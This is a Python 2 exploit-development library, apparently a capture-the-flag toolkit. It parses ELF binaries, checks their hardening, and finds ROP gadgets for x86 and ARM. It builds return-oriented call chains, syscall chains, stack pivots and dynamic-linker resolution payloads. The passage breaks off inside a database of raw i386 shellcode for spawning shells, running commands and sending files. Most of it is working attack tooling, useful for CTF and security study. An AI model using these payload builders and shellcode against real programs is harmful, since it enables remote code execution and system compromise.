#!/usr/bin/env python

import sys
import os
import re
import struct
import socket
import fcntl
import select
import random
import tempfile
from subprocess import Popen, PIPE
from threading import Thread, Event
from telnetlib import Telnet
from contextlib import contextmanager
from copy import deepcopy


def int16(x):
    if isinstance(x, (list, tuple)):
        return [int(n, 16) for n in x]
    else:
        return int(x, 16)

def p32(x):
    if isinstance(x, str):
        return struct.unpack('<I', x)[0]
    elif isinstance(x, (list, tuple)):
        return struct.pack('<' + ('I'*len(x)), *x)
    else:
        return struct.pack('<I', x)

def p64(x):
    if isinstance(x, str):
        return struct.unpack('<Q', x)[0]
    elif isinstance(x, (list, tuple)):
        return struct.pack('<' + ('Q'*len(x)), *x)
    else:
        return struct.pack('<Q', x)

def randint(nbytes):
    return random.getrandbits(nbytes * 8)


class ELF(object):
    def __init__(self, fpath, base=0):
        def env_with(d):
            env = os.environ.copy()
            env.update(d)
            return env

        self.fpath = fpath
        self.base = base
        self.sec = dict(relro=False, bind_now=False, stack_canary=False, nx=False, pie=False, rpath=False, runpath=False, dt_debug=False)

        if not os.path.exists(fpath):
            raise Exception("file not found: %r" % fpath)

        self._entry_point = None
        self._section = {}
        self._dynamic = {}
        self._got = {}
        self._plt = {}
        self._symbol = {}
        self._load_blobs = []

        regexp = {
            'section': r'^\s*\[(?P<Nr>[^\]]+)\]\s+(?P<Name>\S+)\s+(?P<Type>\S+)\s+(?P<Address>\S+)\s+(?P<Off>\S+)\s+(?P<Size>\S+)\s+(?P<ES>\S+)\s+(?P<Flg>\S+)\s+(?P<Lk>\S+)\s+(?P<Inf>\S+)\s+(?P<Al>\S+)$',
            'program': r'^\s*(?P<Type>\S+)\s+(?P<Offset>\S+)\s+(?P<VirtAddr>\S+)\s+(?P<PhysAddr>\S+)\s+(?P<FileSiz>\S+)\s+(?P<MemSiz>\S+)\s+(?P<Flg>.{3})\s+(?P<Align>\S+)$',
            'dynamic': r'^\s*(?P<Tag>\S+)\s+\((?P<Type>[^)]+)\)\s+(?P<Value>.+)$',
            'reloc': r'^\s*(?P<Offset>\S+)\s+(?P<Info>\S+)\s+(?P<Type>\S+)\s+(?P<Value>\S+)\s+(?P<Name>\S+)(?: \+ (?P<AddEnd>\S+))?$',
            'symbol': r'^\s*(?P<Num>[^:]+):\s+(?P<Value>\S+)\s+(?P<Size>\S+)\s+(?P<Type>\S+)\s+(?P<Bind>\S+)\s+(?P<Vis>\S+)\s+(?P<Ndx>\S+)\s+(?P<Name>\S+)',
        }
        plt_entry_size = 0x10
        has_dynamic_section = True
        has_symbol_table = True

        p = Popen(['readelf', '-W', '-a', fpath], env=env_with({"LC_MESSAGES": "C"}), stdout=PIPE)
        # read ELF Header
        while True:
            line = p.stdout.readline()
            if line == 'Section Headers:\n':
                break
            m = re.search(r'^\s*(?P<key>[^:]+):\s+(?P<value>.+)$', line)
            if not m:
                continue
            key, value = m.group('key', 'value')
            if key == 'Class':
                if value == 'ELF64':
                    self.wordsize = 8
                elif value == 'ELF32':
                    self.wordsize = 4
                else:
                    raise Exception("unsupported ELF Class: %r" % value)
            elif key == 'Type':
                if value == 'DYN (Shared object file)':
                    self.sec['pie'] = True
                elif value == 'EXEC (Executable file)':
                    self.sec['pie'] = False
                else:
                    raise Exception("unsupported ELF Type: %r" % value)
            elif key == 'Machine':
                if value == 'Advanced Micro Devices X86-64':
                    self.arch = 'x86-64'
                elif value == 'Intel 80386':
                    self.arch = 'i386'
                elif value == 'ARM':
                    self.arch = 'arm'
                else:
                    raise Exception("unsupported ELF Machine: %r" % value)
            elif key == 'Entry point address':
                self._entry_point = int16(value)
        # read Section Headers
        while True:
            line = p.stdout.readline()
            if line == 'Program Headers:\n':
                break
            m = re.search(regexp['section'], line)
            if not m or m.group('Nr') == 'Nr':
                continue
            name = m.group('Name')
            address, size = int16(m.group('Address', 'Size'))
            self._section[name] = (address, size)
        # read Program Headers
        while True:
            line = p.stdout.readline()
            if line.startswith('Dynamic section'):
                has_dynamic_section = True
                break
            elif line == 'There is no dynamic section in this file.\n':
                has_dynamic_section = False
                break
            m = re.search(regexp['program'], line)
            if not m or m.group('Type') == 'Type':
                continue
            type_, flg = m.group('Type', 'Flg')
            offset, virtaddr, filesiz = int16(m.group('Offset', 'VirtAddr', 'FileSiz'))
            if type_ == 'GNU_RELRO':
                self.sec['relro'] = True
            elif type_ == 'GNU_STACK':
                if not 'E' in flg:
                    self.sec['nx'] = True
            elif type_ == 'LOAD':
                with open(fpath, 'rb') as f:
                    f.seek(offset)
                    blob = f.read(filesiz)
                is_executable = ('E' in flg)
                self._load_blobs.append((virtaddr, blob, is_executable))
        # read Dynamic section
        while has_dynamic_section:
            line = p.stdout.readline()
            if line.startswith('Relocation section') and '.plt' in line:
                break
            m = re.search(regexp['dynamic'], line)
            if not m or m.group('Tag') == 'Tag':
                continue
            type_, value = m.group('Type', 'Value')
            if type_ == 'BIND_NOW':
                self.sec['bind_now'] = True
            elif type_ == 'RPATH':
                self.sec['rpath'] = True
            elif type_ == 'RUNPATH':
                self.sec['runpath'] = True
            elif type_ == 'DEBUG':
                self.sec['dt_debug'] = True
            if value.startswith('0x'):
                self._dynamic[type_] = int16(value)
            elif value.endswith(' (bytes)'):
                self._dynamic[type_] = int(value.split()[0])
        # read Relocation section (.rel.plt/.rela.plt)
        in_unwind_table_index = False
        while True:
            line = p.stdout.readline()
            if line.startswith('Symbol table'):
                has_symbol_table = True
                break
            elif line == 'No version information found in this file.\n':
                has_symbol_table = False
                break
            elif in_unwind_table_index or line.startswith('Unwind table index'):
                in_unwind_table_index = True
                continue
            m = re.search(regexp['reloc'], line)
            if not m or m.group('Offset') == 'Offset':
                continue
            type_, name = m.group('Type', 'Name')
            offset, info = int16(m.group('Offset', 'Info'))
            if not type_.endswith('JUMP_SLOT'):
                continue
            self._got[name] = offset
            self._plt[name] = int16(m.group('Value'))
            if self._plt[name] == 0:
                if self.wordsize == 8:
                    elf_r_sym = info >> 32
                else:
                    elf_r_sym = info >> 8
                self._plt[name] = self._section['.plt'][0] + plt_entry_size * elf_r_sym
            if name == '__stack_chk_fail':
                self.sec['stack_canary'] = True
        # read Symbol table
        while has_symbol_table:
            line = p.stdout.readline()
            if line.startswith('Version symbols section') or line == 'No version information found in this file.\n':
                break
            m = re.search(regexp['symbol'], line)
            if not m or m.group('Num') == 'Num':
                continue
            if m.group('Ndx') == 'UND':
                continue
            name, value = m.group('Name'), int16(m.group('Value'))
            self._symbol[name] = value
            if '@@' in name:
                default_name = name.split('@@')[0]
                self._symbol[default_name] = value
        p.wait()

    def set_base(self, addr, ref_symbol=None):
        self.base = addr
        if ref_symbol:
            self.base -= self._symbol[ref_symbol]

    def offset(self, offset):
        return self.base + offset

    def section(self, name):
        return self.offset(self._section[name][0])

    def dynamic(self, name):
        return self.offset(self._dynamic[name])

    def got(self, name=None):
        if name:
            return self.offset(self._got[name])
        else:
            return self.dynamic('PLTGOT')

    def plt(self, name=None):
        if name:
            return self.offset(self._plt[name])
        else:
            return self.offset(self._section['.plt'][0])

    def addr(self, name):
        return self.offset(self._symbol[name])

    def str(self, name):
        return self.search(name + '\x00')

    def search(self, s, xonly=False):
        if isinstance(s, int):
            s = self.p(s)

        for virtaddr, blob, is_executable in self._load_blobs:
            if xonly and not is_executable:
                continue
            if isinstance(s, re._pattern_type):
                m = re.search(s, blob)
                if m:
                    return self.offset(virtaddr + m.start())
            else:
                try:
                    i = blob.index(s)
                    return self.offset(virtaddr + i)
                except ValueError:
                    pass
        else:
            raise ValueError()

    def checksec(self):
        result = ''
        if self.sec['relro']:
            result += '\033[32mFull RELRO   \033[m   ' if self.sec['bind_now'] else '\033[33mPartial RELRO\033[m   '
        else:
            result += '\033[31mNo RELRO     \033[m   '
        result += '\033[32mCanary found   \033[m   ' if self.sec['stack_canary'] else '\033[31mNo canary found\033[m   '
        result += '\033[32mNX enabled \033[m   ' if self.sec['nx'] else '\033[31mNX disabled\033[m   '
        result += '\033[32mPIE enabled  \033[m   ' if self.sec['pie'] else '\033[31mNo PIE       \033[m   '
        result += '\033[31mRPATH    \033[m  ' if self.sec['rpath'] else '\033[32mNo RPATH \033[m  '
        result += '\033[31mRUNPATH    \033[m  ' if self.sec['runpath'] else '\033[32mNo RUNPATH \033[m  '
        result += self.fpath

        print 'RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE'
        print "%s\n" % result

        fortified_funcs = [name for name in self._plt if re.search(r'^__\w+_chk$', name)]
        if fortified_funcs:
            print "FORTIFY_SOURCE: \033[32mFortified\033[m (%s)" % ', '.join(fortified_funcs)
        else:
            print 'FORTIFY_SOURCE: \033[31mNo\033[m'

    def objdump(self):
        p = Popen(Asm.cmd[self.arch]['objdump'] + [self.fpath], stdout=PIPE)
        stdout, stderr = p.communicate()

        p = Popen(['strings', '-tx', fpath], stdout=PIPE)
        rev_string = dict((int16(line[:7].strip()), line[8:-1]) for line in p.stdout)
        p.wait()

        rev_symbol = {}
        rev_plt = {}
        for k, v in self._symbol.iteritems():
            rev_symbol.setdefault(v, []).append(k)
        for k, v in self._plt.iteritems():
            rev_plt.setdefault(v, []).append(k)

        lines = []
        labels = {}
        code_xrefs = {}
        data_xrefs = {}

        # collect addresses
        for line in stdout.splitlines():
            ary = line.strip().split(':', 1)
            try:
                addr, expr = int16(ary[0]), ary[1]
                labels[addr] = None
            except ValueError:
                addr, expr = None, None
            lines.append((line, addr, expr))

        # collect references
        for line, addr, expr in lines:
            if addr is None:
                continue

            if addr == self._entry_point:
                labels[addr] = '_start'

            m = re.search(r'call\s+(?:0x)?([\dA-Fa-f]+)\b', line)
            if m:
                ref = int16(m.group(1))
                labels[ref] = "sub_%x" % ref
                code_xrefs.setdefault(ref, set()).add(addr)

            m = re.search(r'j\w{1,2}\s+(?:0x)?([\dA-Fa-f]+)\b', line)
            if m:
                ref = int16(m.group(1))
                labels[ref] = "loc_%x" % ref
                code_xrefs.setdefault(ref, set()).add(addr)

            for m in re.finditer(r',0x([\dA-Fa-f]{3,})\b', expr):
                ref = int16(m.group(1))
                if ref in labels:
                    labels[ref] = "loc_%x" % ref
                    data_xrefs.setdefault(ref, set()).add(addr)

        for k, v in code_xrefs.iteritems():
            code_xrefs[k] = sorted(list(v))
        for k, v in data_xrefs.iteritems():
            data_xrefs[k] = sorted(list(v))

        # output with annotations
        def repl_func1(addr, color):
            def _f(m):
                ref = int16(m.group(2))
                return "\x1b[%dm%s%s [%+#x]\x1b[0m" % (color, m.group(1), labels[ref], ref-addr)
            return _f

        def repl_func2(color):
            def _f(m):
                addr = int16(m.group(1))
                if addr in labels and not addr in rev_symbol:
                    return ",\x1b[%dm%s\x1b[0m" % (color, labels[addr])
                else:
                    return m.group(0)
            return _f

        arrows = {}
        for k, v in [(True, u'\u25b2'), (False, u'\u25bc')]:
            arrows[k] = v.encode('utf-8')

        for line, addr, expr in lines:
            if addr is None:
                print line
                continue

            line = re.sub(r'(call\s+)[\dA-Fa-f]+\s+<([\w@\.]+)>', '\x1b[33m\\1\\2\x1b[0m', line)
            line = re.sub(r'(call\s+)(?:0x)?([\dA-Fa-f]+)\b.*', repl_func1(addr, 33), line)
            line = re.sub(r'(j\w{1,2}\s+)[\dA-Fa-f]+\s+<([\w@\.]+)>', '\x1b[32m\\1\\2\x1b[0m', line)
            line = re.sub(r'(j\w{1,2}\s+)(?:0x)?([\dA-Fa-f]+)\b.*', repl_func1(addr, 32), line)
            line = re.sub(r',0x([\dA-Fa-f]{3,})\b', repl_func2(36), line)

            expr = line.split(':', 1)[1]

            label = ''
            if labels[addr]:
                if not addr in rev_symbol and not addr in rev_plt:
                    if labels[addr].startswith('loc_'):
                        color = 32
                    else:
                        color = 33
                    label += "\x1b[%dm%s:\x1b[0m" % (color, labels[addr])
                    label = label.ljust(78+9)
                else:
                    label = label.ljust(78)
                if addr in code_xrefs:
                    ary = ["%x%s" % (x, arrows[x < addr]) for x in code_xrefs[addr]]
                    label += " \x1b[32m; CODE XREF: %s\x1b[0m" % ', '.join(ary)
                if addr in data_xrefs:
                    ary = ["%x%s" % (x, arrows[x < addr]) for x in data_xrefs[addr]]
                    label += " \x1b[36m; DATA XREF: %s\x1b[0m" % ', '.join(ary)
                if addr == self._entry_point:
                    label += ' \x1b[33m; ENTRY POINT\x1b[0m'
            if label:
                print label

            annotations = []
            for m in re.finditer(r'([\dA-Fa-f]{3,})\b', expr):
                ref = int16(m.group(1))

                if 0 <= ref - self._section['.data'][0] < self._section['.data'][1]:
                    annotations.append('[.data]')
                elif 0 <= ref - self._section['.bss'][0] < self._section['.bss'][1]:
                    annotations.append('[.bss]')

                if ref in rev_symbol:
                    annotations.append(', '.join(rev_symbol[ref]))

                for virtaddr, blob, is_exebutable in self._load_blobs:
                    offset = ref - virtaddr
                    if offset in rev_string:
                        annotations.append(repr(rev_string[offset]))
                        break

            if annotations:
                print "%-70s \x1b[30;1m; %s\x1b[0m" % (line, ' '.join(annotations))
            else:
                print line

            if re.search(r'\t(?:ret|jmp)', line):
                print "\x1b[30;1m; %s\x1b[0m" % ('-' * 78)


class ROP(ELF):
    def __init__(self, *args, **kwargs):
        ELF.__init__(self, *args, **kwargs)
        if self.arch in ('i386', 'x86-64'):
            self.__class__ = type('ROPX86', (ROPX86,), {})
        elif self.arch == 'arm':
            self.__class__ = type('ROPARM', (ROPARM,), {})
        else:
            raise Exception("unknown architecture: %r" % self.arch)

    def p(self, x):
        if self.wordsize == 8:
            return p64(x)
        else:
            return p32(x)

    def gadget(self, s):
        return self.search(s, xonly=True)

    def string(self, s):
        return s + '\x00'

    def junk(self, n=1):
        return self.fill(self.wordsize * n)

    def fill(self, size, buf=''):
        chars = '0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz'
        buflen = size - len(buf)
        assert buflen >= 0, "%d bytes over" % (-buflen,)
        return ''.join(random.choice(chars) for i in xrange(buflen))

    def align(self, addr, origin, size):
        padlen = size - ((addr-origin) % size)
        return (addr+padlen, padlen)

    def derive(self, blob, base=0):
        derived = deepcopy(self)
        derived._load_blobs = [(0, blob, True)]
        derived.base = base
        return derived

    def scan_gadgets(self, regexp):
        for virtaddr, blob, is_executable in self._load_blobs:
            if not is_executable:
                continue

            for m in re.finditer(regexp, blob):
                if self.arch == 'arm':
                    arch = 'thumb'
                else:
                    arch = self.arch
                p = Popen(Asm.cmd[arch]['objdump_binary'] + ["--adjust-vma=%d" % virtaddr, "--start-address=%d" % (virtaddr+m.start()), self.fpath], stdout=PIPE)
                stdout, stderr = p.communicate()

                lines = stdout.splitlines()[7:]
                if '\t(bad)' in lines[0]:
                    continue

                for line in lines:
                    print line
                    if re.search(r'\t(?:ret|jmp|\(bad\)|; <UNDEFINED> instruction|\.\.\.)', line):
                        print '-' * 80
                        break

    def list_gadgets(self):
        raise NotImplementedError("not implemented for this architecture: %r" % self.arch)


class ROPX86(ROP):
    def gadget(self, keyword, reg=None, n=1):
        def regexp_or(*args):
            return re.compile('(?:' + '|'.join(map(re.escape, args)) + ')')

        table = {
            'pushad': '\x60\xc3',  # i386 only
            'popad': '\x61\xc3',   # i386 only
            'leave': '\xc9\xc3',
            'ret': '\xc3',
            'int3': '\xcc',
            'int0x80': '\xcd\x80',
            'call_gs': '\x65\xff\x15\x10\x00\x00\x00',
            'syscall': '\x0f\x05',
        }
        if keyword in table:
            return self.search(table[keyword], xonly=True)

        regs = ['rax', 'rcx', 'rdx', 'rbx', 'rsp', 'rbp', 'rsi', 'rdi', 'r8', 'r9', 'r10', 'r11', 'r12', 'r13', 'r14', 'r15']
        if reg:
            try:
                r = regs.index('r'+reg[1:])
                need_prefix = bool(r >= 8)
                if need_prefix:
                    r -= 8
            except ValueError:
                raise Exception("unexpected register: %r" % reg)
        else:
            r = regs.index('rsp')
            need_prefix = False

        if keyword == 'pop':
            if reg:
                prefix = '\x41' if need_prefix else ''
                chunk1 = prefix + chr(0x58+r) + '\xc3'
                chunk2 = prefix + '\x8f' + chr(0xc0+r) + '\xc3'
                return self.search(regexp_or(chunk1, chunk2), xonly=True)
            else:
                # skip rsp
                if self.wordsize == 8:
                    return self.search(re.compile(r"(?:[\x58-\x5b\x5d-\x5f]|\x8f[\xc0-\xc3\xc5-\xc7]|\x41(?:[\x58-\x5f]|\x8f[\xc0-\xc7])){%d}\xc3" % n), xonly=True)
                else:
                    return self.search(re.compile(r"(?:[\x58-\x5b\x5d-\x5f]|\x8f[\xc0-\xc3\xc5-\xc7]){%d}\xc3" % n), xonly=True)
        elif keyword == 'call':
            prefix = '\x41' if need_prefix else ''
            chunk = prefix + '\xff' + chr(0xd0+r)
            return self.search(chunk, xonly=True)
        elif keyword == 'jmp':
            prefix = '\x41' if need_prefix else ''
            chunk = prefix + '\xff' + chr(0xe0+r)
            return self.search(chunk, xonly=True)
        elif keyword == 'push':
            prefix = '\x41' if need_prefix else ''
            chunk1 = prefix + chr(0x50+r) + '\xc3'
            chunk2 = prefix + '\xff' + chr(0xf0+r) + '\xc3'
            return self.search(regexp_or(chunk1, chunk2), xonly=True)
        elif keyword == 'pivot':
            # chunk1: xchg REG, rsp
            # chunk2: xchg rsp, REG
            if need_prefix:
                chunk1 = '\x49\x87' + chr(0xe0+r) + '\xc3'
                chunk2 = '\x4c\x87' + chr(0xc4+8*r) + '\xc3'
            else:
                prefix = '\x48' if (reg[0] == 'r') else ''
                if r == 0:
                    chunk1 = prefix + '\x94\xc3'
                else:
                    chunk1 = prefix + '\x87' + chr(0xe0+r) + '\xc3'
                chunk2 = prefix + '\x87' + chr(0xc4+8*r) + '\xc3'
            return self.search(regexp_or(chunk1, chunk2), xonly=True)
        elif keyword == 'loop':
            chunk1 = '\xeb\xfe'
            chunk2 = '\xe9\xfb\xff\xff\xff'
            return self.search(regexp_or(chunk1, chunk2), xonly=True)
        else:
            # search directly
            return ROP.gadget(self, keyword)

    def call(self, addr, *args):
        if isinstance(addr, str):
            addr = self.plt(addr)

        if self.wordsize == 8:
            regs = ['rdi', 'rsi', 'rdx', 'rcx', 'r8', 'r9']
            buf = ''
            for i, arg in enumerate(args):
                buf += self.p([self.gadget('pop', regs[i]), arg])
            buf += self.p(addr)
            buf += self.p(args[6:])
            return buf
        else:
            buf = self.p(addr)
            buf += self.p(self.gadget('pop', n=len(args)))
            buf += self.p(args)
            return buf

    def call_chain_ptr(self, *calls, **kwargs):
        if self.wordsize != 8:
            raise Exception('support x86-64 only')

        gadget_candidates = [
            # gcc (Ubuntu/Linaro 4.6.3-1ubuntu5) 4.6.3
            # Ubuntu clang version 3.0-6ubuntu3 (tags/RELEASE_30/final) (based on LLVM 3.0)
            ('\x4c\x89\xfa\x4c\x89\xf6\x44\x89\xef\x41\xff\x14\xdc\x48\x83\xc3\x01\x48\x39\xeb\x75\xea', '\x48\x8b\x5c\x24\x08\x48\x8b\x6c\x24\x10\x4c\x8b\x64\x24\x18\x4c\x8b\x6c\x24\x20\x4c\x8b\x74\x24\x28\x4c\x8b\x7c\x24\x30\x48\x83\xc4\x38\xc3', False),
            # gcc (GCC) 4.4.7 20120313 (Red Hat 4.4.7-4)
            ('\x4c\x89\xfa\x4c\x89\xf6\x44\x89\xef\x41\xff\x14\xdc\x48\x83\xc3\x01\x48\x39\xeb\x72\xea', '\x48\x8b\x5c\x24\x08\x48\x8b\x6c\x24\x10\x4c\x8b\x64\x24\x18\x4c\x8b\x6c\x24\x20\x4c\x8b\x74\x24\x28\x4c\x8b\x7c\x24\x30\x48\x83\xc4\x38\xc3', False),
            # gcc 4.8.2-19ubuntu1
            ('\x4c\x89\xea\x4c\x89\xf6\x44\x89\xff\x41\xff\x14\xdc\x48\x83\xc3\x01\x48\x39\xeb\x75\xea', '\x48\x8b\x5c\x24\x08\x48\x8b\x6c\x24\x10\x4c\x8b\x64\x24\x18\x4c\x8b\x6c\x24\x20\x4c\x8b\x74\x24\x28\x4c\x8b\x7c\x24\x30\x48\x83\xc4\x38\xc3', True),
            # gcc (Ubuntu 4.8.2-19ubuntu1) 4.8.2
            ('\x4c\x89\xea\x4c\x89\xf6\x44\x89\xff\x41\xff\x14\xdc\x48\x83\xc3\x01\x48\x39\xeb\x75\xea', '\x48\x83\xc4\x08\x5b\x5d\x41\x5c\x41\x5d\x41\x5e\x41\x5f\xc3', True),
        ]

        for chunk1, chunk2, _args_reversed in gadget_candidates:
            try:
                set_regs = self.gadget(chunk2)
                call_ptr = self.gadget(chunk1 + chunk2)
                args_reversed = _args_reversed
                break
            except ValueError:
                pass
        else:
            raise Exception('gadget not found')

        buf = self.p(set_regs)

        for args in calls:
            if len(args) > 4:
                raise Exception('4th argument and latter should be set in advance')
            elif args[1] >= (1<<32):
                raise Exception("1st argument should be less than 2^32: %x" % args[1])

            ptr = args.pop(0)
            if isinstance(ptr, str):
                ptr = self.got(ptr)

            buf += self.junk()
            buf += self.p([0, 1, ptr])
            if not args_reversed:
                for arg in args:
                    buf += self.p(arg)
                buf += self.junk(3-len(args))
            else:
                buf += self.junk(3-len(args))
                for arg in reversed(args):
                    buf += self.p(arg)
            buf += self.p(call_ptr)

        buf += self.junk()
        if 'pivot' in kwargs:
            buf += self.p(0)
            buf += self.p(kwargs['pivot'] - self.wordsize)
            buf += self.p(0) * 4
            buf += self.p(self.gadget('leave'))
        else:
            buf += self.p(0) * 6
        return buf

    def dl_resolve_data(self, base, name):
        if self.wordsize == 8:
            jmprel = self.dynamic('JMPREL')
            relaent = self.dynamic('RELAENT')
            symtab = self.dynamic('SYMTAB')
            syment = self.dynamic('SYMENT')
            strtab = self.dynamic('STRTAB')

            addr_reloc, padlen_reloc = self.align(base, jmprel, relaent)
            addr_sym, padlen_sym = self.align(addr_reloc+relaent, symtab, syment)
            addr_symstr = addr_sym + syment

            r_info = (((addr_sym - symtab) / syment) << 32) | 0x7
            st_name = addr_symstr - strtab

            buf = self.fill(padlen_reloc)
            buf += struct.pack('<QQQ', base, r_info, 0)                  # Elf64_Rela
            buf += self.fill(padlen_sym)
            buf += struct.pack('<IIQQ', st_name, 0x12, 0, 0)             # Elf64_Sym
            buf += self.string(name)
        else:
            jmprel = self.dynamic('JMPREL')
            relent = self.dynamic('RELENT')
            symtab = self.dynamic('SYMTAB')
            syment = self.dynamic('SYMENT')
            strtab = self.dynamic('STRTAB')

            addr_reloc, padlen_reloc = self.align(base, jmprel, relent)
            addr_sym, padlen_sym = self.align(addr_reloc+relent, symtab, syment)
            addr_symstr = addr_sym + syment

            r_info = (((addr_sym - symtab) / syment) << 8) | 0x7
            st_name = addr_symstr - strtab

            buf = self.fill(padlen_reloc)
            buf += struct.pack('<II', base, r_info)                      # Elf32_Rel
            buf += self.fill(padlen_sym)
            buf += struct.pack('<IIII', st_name, 0, 0, 0x12)             # Elf32_Sym
            buf += self.string(name)

        return buf

    def dl_resolve_call(self, base, *args):
        if self.wordsize == 8:
            # prerequisite:
            # 1) overwrite (link_map + 0x1c8) with NULL
            # 2) set registers for arguments
            if args:
                raise Exception('arguments must be set to the registers beforehand')

            jmprel = self.dynamic('JMPREL')
            relaent = self.dynamic('RELAENT')

            addr_reloc, padlen_reloc = self.align(base, jmprel, relaent)
            reloc_offset = (addr_reloc - jmprel) / relaent

            buf = self.p(self.plt())
            buf += self.p(reloc_offset)
        else:
            jmprel = self.dynamic('JMPREL')
            relent = self.dynamic('RELENT')

            addr_reloc, padlen_reloc = self.align(base, jmprel, relent)
            reloc_offset = addr_reloc - jmprel

            buf = self.p(self.plt())
            buf += self.p(reloc_offset)
            buf += self.p(self.gadget('pop', n=len(args)))
            buf += self.p(args)

        return buf

    def syscall(self, number, *args):
        if self.wordsize == 8:
            arg_regs = ['rdi', 'rsi', 'rdx', 'r10', 'r8', 'r9']
            buf = self.p([self.gadget('pop', 'rax'), number])
            for arg_reg, arg in zip(arg_regs, args):
                buf += self.p([self.gadget('pop', arg_reg), arg])
            buf += self.p(self.gadget('syscall'))
        else:
            try:
                arg_regs = ['ebx', 'ecx', 'edx', 'esi', 'edi', 'ebp']
                buf = self.p([self.gadget('pop', 'eax'), number])
                for arg_reg, arg in zip(arg_regs, args):
                    buf += self.p([self.gadget('pop', arg_reg), arg])
            except ValueError:
                # popad = pop edi, esi, ebp, esp, ebx, edx, ecx, eax
                args = list(args) + [0] * (6-len(args))
                buf = self.p([self.gadget('popad'), args[4], args[3], args[5], 0, args[0], args[2], args[1], number])
            buf += self.p(self.gadget('int0x80'))
        return buf

    def pivot(self, rsp):
        buf = self.p([self.gadget('pop', 'rbp'), rsp-self.wordsize])
        buf += self.p(self.gadget('leave'))
        return buf

    def retfill(self, size, buf=''):
        buflen = size - len(buf)
        assert buflen >= 0, "%d bytes over" % (-buflen,)
        s = self.fill(buflen % self.wordsize)
        s += self.p(self.gadget('ret')) * (buflen // self.wordsize)
        return s

    def list_gadgets(self):
        if self.wordsize == 8:
            regs = ['rax', 'rcx', 'rdx', 'rbx', 'rsp', 'rbp', 'rsi', 'rdi', 'r8', 'r9', 'r10', 'r11', 'r12', 'r13', 'r14', 'r15']
        else:
            regs = ['eax', 'ecx', 'edx', 'ebx', 'esp', 'ebp', 'esi', 'edi']

        print "%8s" % 'pop',
        for i in range(6):
            try:
                self.gadget('pop', n=i+1)
                print "\033[32m%d\033[m" % (i+1),
            except ValueError:
                print "\033[31m%d\033[m" % (i+1),
        print

        for keyword in ['pop', 'jmp', 'call', 'push', 'pivot']:
            print "%8s" % keyword,
            for reg in regs:
                try:
                    self.gadget(keyword, reg)
                    print "\033[32m%s\033[m" % reg,
                except ValueError:
                    print "\033[31m%s\033[m" % reg,
            print

        print "%8s" % 'etc',
        for keyword in ['pushad', 'popad', 'leave', 'ret', 'int3', 'int0x80', 'call_gs', 'syscall', 'loop']:
            try:
                self.gadget(keyword)
                print "\033[32m%s\033[m" % keyword,
            except ValueError:
                print "\033[31m%s\033[m" % keyword,
        print


class ROPARM(ROP):
    def pt(self, x):
        if isinstance(x, str):
            return (self(x) | 1)
        else:
            return self.p(x | 1)

    def gadget(self, keyword, reg=None, n=1):
        table = {
            'pop_r7': '\x80\xbd',                            # pop {r7, pc}
            'pop_fp': '\x00\x88\xbd\xe8',                    # pop {fp, pc}
            'pivot_r7': '\xbd\x46\x80\xbd',                  # mov sp, r7; pop {r7, pc}
            'pivot_fp': '\x0b\xd0\xa0\xe1\x00\x88\xbd\xe8',  # mov sp, fp; pop {fp, pc}
            'svc0': '\xdf\x00',                              # svc 0
        }
        if keyword in table:
            return self.search(table[keyword], xonly=True)

        # search directly
        return ROP.gadget(self, keyword)

    def call_chain(self, *calls, **kwargs):
        gadget_candidates = [
            # gcc (Ubuntu/Linaro 4.8.2-19ubuntu1) 4.8.2
            ('\x38\x46\x41\x46\x4a\x46\x98\x47\xb4\x42\xf6\xd1', '\xbd\xe8\xf8\x83'),
        ]

        for chunk1, chunk2 in gadget_candidates:
            try:
                set_regs = self.gadget(chunk2)
                call_reg = self.gadget(chunk1 + chunk2)
                break
            except ValueError:
                pass
        else:
            raise Exception('gadget not found')

        buf = self.pt(set_regs)

        for args in calls:
            if len(args) > 4:
                raise Exception('4th argument and latter should be set in advance')

            addr = args.pop(0)
            if isinstance(addr, str):
                addr = self.plt(addr)

            buf += self.p(addr)
            buf += self.p([0, 0, 0])
            for arg in args:
                buf += self.p(arg)
            buf += self.junk(3-len(args))
            buf += self.pt(call_reg)

        if 'pivot' in kwargs:
            try:
                buf += self.pt(self.gadget('pivot_r7'))
                buf += self.p(0) * 3
                buf += self.p(kwargs['pivot'] - self.wordsize)
                buf += self.p(0) * 2
                buf += self.pt(call_reg)
            except ValueError:
                buf += self.p(0) * 7
                buf += self.pivot(kwargs['pivot'])
        else:
            buf += self.p(0) * 7
        return buf

    def pivot(self, rsp):
        try:
            addr = self.gadget('pivot_r7')
            return self.p([addr+2, rsp-self.wordsize, addr])
        except ValueError:
            addr = self.gadget('pivot_fp')
            return self.p([addr+4, rsp-self.wordsize, addr])

    def list_gadgets(self):
        print "%8s" % 'etc',
        for keyword in ['pop_r7', 'pop_fp', 'pivot_r7', 'pivot_fp', 'svc0']:
            try:
                self.gadget(keyword)
                print "\033[32m%s\033[m" % keyword,
            except ValueError:
                print "\033[31m%s\033[m" % keyword,
        print


class Shellcode(object):
    _database = {
        'i386': {
            'noppairs': ['AI', 'BJ', 'CK', 'FN', 'GO'],
            'exec_shell': '\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x52\x53\x89\xe1\xcd\x80',
            'exec_command': '\xeb\x29\x5e\x31\xc9\x8a\x0e\x46\x88\x2c\x0e\x6a\x0b\x58\x99\x52\x66\x68\x2d\x63\x89\xe1\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x52\x56\x51\x53\x89\xe1\xcd\x80\xe8\xd2\xff\xff\xff',
            'dup': '\x31\xd2\x8d\x5a${fd}\x8d\x4a\x02\x8d\x42\x3f\xcd\x80\x49\x7d\xf8',
            'cat': '\xeb\x21\x5e\x31\xc9\x8a\x0e\x46\x88\x2c\x0e\x6a\x0b\x58\x99\x52\x68\x2f\x63\x61\x74\x68\x2f\x62\x69\x6e\x89\xe3\x52\x56\x53\x89\xe1\xcd\x80\xe8\xda\xff\xff\xff',
            'sendfile': '\xeb\x2a\x5b\x31\xc9\x8a\x0b\x43\x88\x2c\x0b\x31\xd2\x31\xc9\x8d\x42\x05\xcd\x80\x91\x8d\x5a${fd}\x8d\x72\x01\xc1\xe6\x10\x8d\x42\x44\xf6\xd0\xcd\x80\x31\xdb\x8d\x42\x01\xcd\x80\xe8\xd1\xff\xff\xff',
